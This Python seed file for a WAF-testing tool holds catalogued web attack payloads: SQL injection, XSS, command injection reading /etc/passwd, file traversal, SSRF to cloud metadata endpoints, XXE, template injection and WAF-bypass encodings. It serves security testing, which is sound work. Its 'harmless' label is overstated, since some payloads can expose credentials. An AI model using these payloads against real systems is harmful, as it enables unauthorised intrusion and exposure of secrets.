"""
Seed payloads for WAF testing.
ALL payloads are HARMLESS - designed to trigger detection without causing damage.
"""

from typing import Dict, List, Any
from sqlalchemy.orm import Session
from ..models import Payload, PayloadCategory, TargetOS

# Harmless payloads organized by category and target
HARMLESS_PAYLOADS: Dict[str, List[Dict[str, Any]]] = {
    # ========================================
    # SQL INJECTION - HARMLESS
    # ========================================
    "sqli": [
        # Generic (works on most DBs)
        {
            "id": "sqli-generic-or",
            "payload": "' OR '1'='1",
            "target_tech": ["generic"],
            "success_pattern": r"(login|welcome|dashboard|admin|true|1)",
            "description": "Basic OR-based authentication bypass",
        },
        {
            "id": "sqli-generic-or-comment",
            "payload": "' OR '1'='1'--",
            "target_tech": ["generic"],
            "success_pattern": r"(login|welcome|dashboard)",
            "description": "OR bypass with comment",
        },
        {
            "id": "sqli-generic-or-hash",
            "payload": "' OR '1'='1'#",
            "target_tech": ["mysql", "mariadb"],
            "success_pattern": r"(login|welcome|dashboard)",
            "description": "OR bypass with MySQL comment",
        },
        {
            "id": "sqli-generic-union-null",
            "payload": "' UNION SELECT NULL--",
            "target_tech": ["generic"],
            "success_pattern": r"(column|error|syntax)",
            "success_indicator": "error",
            "description": "UNION column count detection",
        },
        {
            "id": "sqli-generic-union-null-3",
            "payload": "' UNION SELECT NULL,NULL,NULL--",
            "target_tech": ["generic"],
            "success_pattern": r"(column|error|syntax)",
            "success_indicator": "error",
            "description": "UNION 3 column detection",
        },
        # MySQL specific
        {
            "id": "sqli-mysql-sleep",
            "payload": "' AND SLEEP(3)--",
            "target_tech": ["mysql", "mariadb"],
            "success_indicator": "time_delay",
            "expected_delay_ms": 3000,
            "description": "MySQL time-based blind SQLi",
        },
        {
            "id": "sqli-mysql-version",
            "payload": "' AND 1=1 UNION SELECT @@version--",
            "target_tech": ["mysql", "mariadb"],
            "success_pattern": r"\d+\.\d+\.\d+",
            "description": "MySQL version disclosure",
        },
        {
            "id": "sqli-mysql-benchmark",
            "payload": "' AND BENCHMARK(5000000,SHA1('test'))--",
            "target_tech": ["mysql", "mariadb"],
            "success_indicator": "time_delay",
            "expected_delay_ms": 2000,
            "description": "MySQL benchmark time-based",
        },
        # MSSQL specific
        {
            "id": "sqli-mssql-waitfor",
            "payload": "'; WAITFOR DELAY '0:0:3'--",
            "target_tech": ["mssql"],
            "success_indicator": "time_delay",
            "expected_delay_ms": 3000,
            "description": "MSSQL time-based blind SQLi",
        },
        {
            "id": "sqli-mssql-version",
            "payload": "' AND 1=CONVERT(int,@@version)--",
            "target_tech": ["mssql"],
            "success_pattern": r"(Microsoft SQL Server|conversion failed)",
            "description": "MSSQL version via error",
        },
        # PostgreSQL specific
        {
            "id": "sqli-pgsql-sleep",
            "payload": "'; SELECT pg_sleep(3)--",
            "target_tech": ["postgresql"],
            "success_indicator": "time_delay",
            "expected_delay_ms": 3000,
            "description": "PostgreSQL time-based blind SQLi",
        },
        {
            "id": "sqli-pgsql-version",
            "payload": "' AND 1=CAST(version() AS int)--",
            "target_tech": ["postgresql"],
            "success_pattern": r"(PostgreSQL|integer)",
            "description": "PostgreSQL version via error",
        },
        # Oracle specific
        {
            "id": "sqli-oracle-sleep",
            "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
            "target_tech": ["oracle"],
            "success_indicator": "time_delay",
            "expected_delay_ms": 3000,
            "description": "Oracle time-based blind SQLi",
        },
        # SQLite specific
        {
            "id": "sqli-sqlite-version",
            "payload": "' UNION SELECT sqlite_version()--",
            "target_tech": ["sqlite"],
            "success_pattern": r"\d+\.\d+",
            "description": "SQLite version disclosure",
        },
        # WAF bypass variants
        {
            "id": "sqli-bypass-case",
            "payload": "' oR '1'='1",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Case variation bypass",
        },
        {
            "id": "sqli-bypass-comment",
            "payload": "'/**/OR/**/1=1--",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Comment injection bypass",
        },
        {
            "id": "sqli-bypass-double-url",
            "payload": "%2527%2520OR%25201%253D1--",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Double URL encoding bypass",
        },
    ],

    # ========================================
    # XSS - HARMLESS (alert only)
    # ========================================
    "xss": [
        {
            "id": "xss-basic-script",
            "payload": "<script>alert('XSS')</script>",
            "target_tech": ["generic"],
            "success_pattern": r"<script>alert",
            "description": "Basic script tag XSS",
        },
        {
            "id": "xss-basic-script-1",
            "payload": "<script>alert(1)</script>",
            "target_tech": ["generic"],
            "success_pattern": r"<script>alert\(1\)",
            "description": "Script alert(1)",
        },
        {
            "id": "xss-img-onerror",
            "payload": "<img src=x onerror=alert('XSS')>",
            "target_tech": ["generic"],
            "success_pattern": r"onerror=alert",
            "description": "IMG onerror XSS",
        },
        {
            "id": "xss-svg-onload",
            "payload": "<svg onload=alert('XSS')>",
            "target_tech": ["generic"],
            "success_pattern": r"<svg onload",
            "description": "SVG onload XSS",
        },
        {
            "id": "xss-body-onload",
            "payload": "<body onload=alert('XSS')>",
            "target_tech": ["generic"],
            "success_pattern": r"<body onload",
            "description": "Body onload XSS",
        },
        {
            "id": "xss-iframe-src",
            "payload": "<iframe src=javascript:alert('XSS')>",
            "target_tech": ["generic"],
            "success_pattern": r"javascript:alert",
            "description": "Iframe javascript XSS",
        },
        {
            "id": "xss-input-onfocus",
            "payload": '"><input onfocus=alert("XSS") autofocus>',
            "target_tech": ["generic"],
            "success_pattern": r"onfocus=alert",
            "description": "Input autofocus XSS",
        },
        {
            "id": "xss-href-javascript",
            "payload": "<a href=javascript:alert('XSS')>click</a>",
            "target_tech": ["generic"],
            "success_pattern": r"href=javascript:",
            "description": "Anchor javascript XSS",
        },
        # WAF bypass variants
        {
            "id": "xss-bypass-case",
            "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Case variation bypass",
        },
        {
            "id": "xss-bypass-null",
            "payload": "<scr%00ipt>alert('XSS')</scr%00ipt>",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Null byte bypass",
        },
        {
            "id": "xss-bypass-newline",
            "payload": "<script\n>alert('XSS')</script>",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Newline bypass",
        },
        {
            "id": "xss-bypass-double-encode",
            "payload": "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Double URL encoding",
        },
        {
            "id": "xss-bypass-html-entity",
            "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "HTML entity bypass (test double decode)",
        },
    ],

    # ========================================
    # COMMAND INJECTION - HARMLESS (read-only commands)
    # ========================================
    "cmdi": [
        # Linux
        {
            "id": "cmdi-linux-semicolon-id",
            "payload": "; id",
            "target_os": "linux",
            "success_pattern": r"uid=\d+.*gid=\d+",
            "description": "Linux id command",
        },
        {
            "id": "cmdi-linux-pipe-whoami",
            "payload": "| whoami",
            "target_os": "linux",
            "success_pattern": r"(root|www-data|apache|nginx|nobody|\w+)",
            "description": "Linux whoami command",
        },
        {
            "id": "cmdi-linux-backtick-id",
            "payload": "`id`",
            "target_os": "linux",
            "success_pattern": r"uid=\d+",
            "description": "Linux backtick id",
        },
        {
            "id": "cmdi-linux-dollar-id",
            "payload": "$(id)",
            "target_os": "linux",
            "success_pattern": r"uid=\d+",
            "description": "Linux command substitution",
        },
        {
            "id": "cmdi-linux-cat-passwd",
            "payload": "; cat /etc/passwd",
            "target_os": "linux",
            "success_pattern": r"root:.*:0:0:",
            "description": "Linux read passwd file",
        },
        {
            "id": "cmdi-linux-uname",
            "payload": "; uname -a",
            "target_os": "linux",
            "success_pattern": r"Linux.*GNU",
            "description": "Linux uname",
        },
        {
            "id": "cmdi-linux-ls",
            "payload": "; ls -la",
            "target_os": "linux",
            "success_pattern": r"(drwx|total \d+)",
            "description": "Linux directory listing",
        },
        # Windows
        {
            "id": "cmdi-win-pipe-dir",
            "payload": "| dir",
            "target_os": "windows",
            "success_pattern": r"(Volume|Directory of)",
            "description": "Windows dir command",
        },
        {
            "id": "cmdi-win-amp-whoami",
            "payload": "& whoami",
            "target_os": "windows",
            "success_pattern": r"\\\\.*\\\\",
            "description": "Windows whoami",
        },
        {
            "id": "cmdi-win-type-hosts",
            "payload": "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "target_os": "windows",
            "success_pattern": r"localhost|127\.0\.0\.1",
            "description": "Windows read hosts file",
        },
        {
            "id": "cmdi-win-type-ini",
            "payload": "| type C:\\windows\\win.ini",
            "target_os": "windows",
            "success_pattern": r"\[fonts\]|\[extensions\]",
            "description": "Windows read win.ini",
        },
        {
            "id": "cmdi-win-systeminfo",
            "payload": "& systeminfo",
            "target_os": "windows",
            "success_pattern": r"(OS Name|Host Name|Windows)",
            "description": "Windows system info",
        },
        # WAF bypass variants
        {
            "id": "cmdi-bypass-ifs",
            "payload": ";${IFS}id",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"uid=\d+",
            "description": "IFS variable bypass",
        },
        {
            "id": "cmdi-bypass-newline",
            "payload": "%0aid",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"uid=\d+",
            "description": "Newline injection bypass",
        },
        {
            "id": "cmdi-bypass-caret",
            "payload": "& w^h^o^a^m^i",
            "target_os": "windows",
            "subcategory": "bypass",
            "description": "Windows caret bypass",
        },
    ],

    # ========================================
    # LFI - HARMLESS (read safe system files)
    # ========================================
    "lfi": [
        # Linux
        {
            "id": "lfi-linux-passwd",
            "payload": "../../../etc/passwd",
            "target_os": "linux",
            "success_pattern": r"root:.*:0:0:",
            "description": "Linux passwd file",
        },
        {
            "id": "lfi-linux-passwd-dots",
            "payload": "....//....//....//etc/passwd",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"root:.*:0:0:",
            "description": "Double-dot bypass",
        },
        {
            "id": "lfi-linux-passwd-encoded",
            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"root:.*:0:0:",
            "description": "URL encoded path",
        },
        {
            "id": "lfi-linux-passwd-null",
            "payload": "../../../etc/passwd%00",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"root:.*:0:0:",
            "description": "Null byte termination",
        },
        {
            "id": "lfi-linux-hosts",
            "payload": "../../../etc/hosts",
            "target_os": "linux",
            "success_pattern": r"localhost|127\.0\.0\.1",
            "description": "Linux hosts file",
        },
        {
            "id": "lfi-linux-issue",
            "payload": "../../../etc/issue",
            "target_os": "linux",
            "success_pattern": r"(Ubuntu|Debian|CentOS|Red Hat|Linux)",
            "description": "Linux issue file",
        },
        {
            "id": "lfi-linux-proc-version",
            "payload": "/proc/version",
            "target_os": "linux",
            "success_pattern": r"Linux version",
            "description": "Linux proc version",
        },
        {
            "id": "lfi-linux-self-environ",
            "payload": "/proc/self/environ",
            "target_os": "linux",
            "success_pattern": r"(PATH=|HOME=|USER=)",
            "description": "Linux process environment",
        },
        # Windows
        {
            "id": "lfi-win-hosts",
            "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "target_os": "windows",
            "success_pattern": r"localhost|127\.0\.0\.1",
            "description": "Windows hosts file",
        },
        {
            "id": "lfi-win-ini",
            "payload": "..\\..\\..\\windows\\win.ini",
            "target_os": "windows",
            "success_pattern": r"\[fonts\]|\[extensions\]",
            "description": "Windows win.ini",
        },
        {
            "id": "lfi-win-boot-ini",
            "payload": "..\\..\\..\\boot.ini",
            "target_os": "windows",
            "success_pattern": r"\[boot loader\]|\[operating systems\]",
            "description": "Windows boot.ini (legacy)",
        },
    ],

    # ========================================
    # SSRF - HARMLESS (probe only)
    # ========================================
    "ssrf": [
        {
            "id": "ssrf-localhost",
            "payload": "http://localhost",
            "target_tech": ["generic"],
            "success_pattern": r"(localhost|127\.0\.0\.1|html|title)",
            "description": "SSRF to localhost",
        },
        {
            "id": "ssrf-127",
            "payload": "http://127.0.0.1",
            "target_tech": ["generic"],
            "success_pattern": r"(localhost|127\.0\.0\.1|html)",
            "description": "SSRF to 127.0.0.1",
        },
        {
            "id": "ssrf-ipv6",
            "payload": "http://[::1]",
            "target_tech": ["generic"],
            "success_pattern": r"(localhost|html)",
            "description": "SSRF to IPv6 localhost",
        },
        {
            "id": "ssrf-aws-metadata",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "target_tech": ["generic"],
            "success_pattern": r"(ami-id|instance|hostname)",
            "description": "AWS metadata endpoint",
        },
        {
            "id": "ssrf-azure-metadata",
            "payload": "http://169.254.169.254/metadata/instance",
            "target_tech": ["generic"],
            "success_pattern": r"(compute|vmId|subscriptionId)",
            "description": "Azure metadata endpoint",
        },
        {
            "id": "ssrf-gcp-metadata",
            "payload": "http://metadata.google.internal/computeMetadata/v1/",
            "target_tech": ["generic"],
            "success_pattern": r"(project|instance|zone)",
            "description": "GCP metadata endpoint",
        },
        # Bypass variants
        {
            "id": "ssrf-bypass-decimal",
            "payload": "http://2130706433",  # 127.0.0.1 in decimal
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Decimal IP bypass",
        },
        {
            "id": "ssrf-bypass-short",
            "payload": "http://127.1",
            "target_tech": ["generic"],
            "subcategory": "bypass",
            "description": "Short IP notation",
        },
    ],

    # ========================================
    # XXE - HARMLESS (file read only)
    # ========================================
    "xxe": [
        {
            "id": "xxe-basic-file",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "target_os": "linux",
            "success_pattern": r"root:.*:0:0:",
            "description": "Basic XXE file read",
        },
        {
            "id": "xxe-win-file",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            "target_os": "windows",
            "success_pattern": r"\[fonts\]",
            "description": "Windows XXE file read",
        },
        {
            "id": "xxe-parameter-entity",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
            "target_os": "linux",
            "success_pattern": r"root:.*:0:0:",
            "description": "Parameter entity XXE",
        },
    ],

    # ========================================
    # SSTI - HARMLESS (calculation only)
    # ========================================
    "ssti": [
        {
            "id": "ssti-jinja-calc",
            "payload": "{{7*7}}",
            "target_tech": ["python"],
            "success_pattern": r"49",
            "description": "Jinja2 template calculation",
        },
        {
            "id": "ssti-jinja-config",
            "payload": "{{config}}",
            "target_tech": ["python"],
            "success_pattern": r"(Config|DEBUG|SECRET)",
            "description": "Jinja2 config disclosure",
        },
        {
            "id": "ssti-erb-calc",
            "payload": "<%= 7*7 %>",
            "target_tech": ["ruby"],
            "success_pattern": r"49",
            "description": "ERB template calculation",
        },
        {
            "id": "ssti-freemarker-calc",
            "payload": "${7*7}",
            "target_tech": ["java"],
            "success_pattern": r"49",
            "description": "FreeMarker calculation",
        },
        {
            "id": "ssti-velocity-calc",
            "payload": "#set($x=7*7)$x",
            "target_tech": ["java"],
            "success_pattern": r"49",
            "description": "Velocity calculation",
        },
        {
            "id": "ssti-smarty-calc",
            "payload": "{php}echo 7*7;{/php}",
            "target_tech": ["php"],
            "success_pattern": r"49",
            "description": "Smarty PHP injection",
        },
        {
            "id": "ssti-twig-calc",
            "payload": "{{7*'7'}}",
            "target_tech": ["php"],
            "success_pattern": r"49|7777777",
            "description": "Twig template test",
        },
    ],

    # ========================================
    # PATH TRAVERSAL
    # ========================================
    "path_traversal": [
        {
            "id": "pt-basic",
            "payload": "../../../../../../etc/passwd",
            "target_os": "linux",
            "success_pattern": r"root:.*:0:0:",
            "description": "Basic path traversal",
        },
        {
            "id": "pt-win-basic",
            "payload": "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "target_os": "windows",
            "success_pattern": r"\[fonts\]",
            "description": "Windows path traversal",
        },
        {
            "id": "pt-encoded",
            "payload": "..%252f..%252f..%252f..%252fetc/passwd",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"root:.*:0:0:",
            "description": "Double encoded traversal",
        },
        {
            "id": "pt-utf8",
            "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
            "target_os": "linux",
            "subcategory": "bypass",
            "success_pattern": r"root:.*:0:0:",
            "description": "UTF-8 overlong encoding",
        },
    ],

    # ========================================
    # OPEN REDIRECT - HARMLESS
    # ========================================
    "open_redirect": [
        {
            "id": "redirect-basic",
            "payload": "//evil.com",
            "target_tech": ["generic"],
            "success_indicator": "redirect",
            "description": "Protocol-relative redirect",
        },
        {
            "id": "redirect-backslash",
            "payload": "\\\\evil.com",
            "target_tech": ["generic"],
            "success_indicator": "redirect",
            "description": "Backslash redirect",
        },
        {
            "id": "redirect-at",
            "payload": "http://example.com@evil.com",
            "target_tech": ["generic"],
            "success_indicator": "redirect",
            "description": "At-sign redirect bypass",
        },
    ],

    # ========================================
    # HEADER INJECTION
    # ========================================
    "header_injection": [
        {
            "id": "header-crlf",
            "payload": "test%0d%0aX-Injected: true",
            "target_tech": ["generic"],
            "success_pattern": r"X-Injected",
            "description": "CRLF header injection",
        },
        {
            "id": "header-host",
            "payload": "evil.com",
            "target_param_location": "header",
            "target_tech": ["generic"],
            "description": "Host header injection",
        },
    ],
}


def seed_payloads(db: Session) -> int:
    """Seed the payload database with harmless payloads."""
    count = 0

    for category, payloads in HARMLESS_PAYLOADS.items():
        for payload_data in payloads:
            payload_id = payload_data["id"]

            # Check if exists
            existing = db.query(Payload).filter(Payload.id == payload_id).first()
            if existing:
                continue

            # Map category string to enum
            try:
                cat_enum = PayloadCategory(category)
            except ValueError:
                continue

            # Map OS
            target_os = payload_data.get("target_os", "both")
            if target_os == "linux":
                os_enum = TargetOS.LINUX
            elif target_os == "windows":
                os_enum = TargetOS.WINDOWS
            else:
                os_enum = TargetOS.BOTH

            payload = Payload(
                id=payload_id,
                category=cat_enum,
                subcategory=payload_data.get("subcategory"),
                payload=payload_data["payload"],
                target_tech=payload_data.get("target_tech", ["generic"]),
                target_os=os_enum,
                target_param_location=payload_data.get("target_param_location", "any"),
                success_pattern=payload_data.get("success_pattern"),
                success_indicator=payload_data.get("success_indicator", "content_change"),
                expected_delay_ms=payload_data.get("expected_delay_ms"),
                is_harmless=True,
                risk_level="safe",
                description=payload_data.get("description"),
            )

            db.add(payload)
            count += 1

    db.commit()
    return count
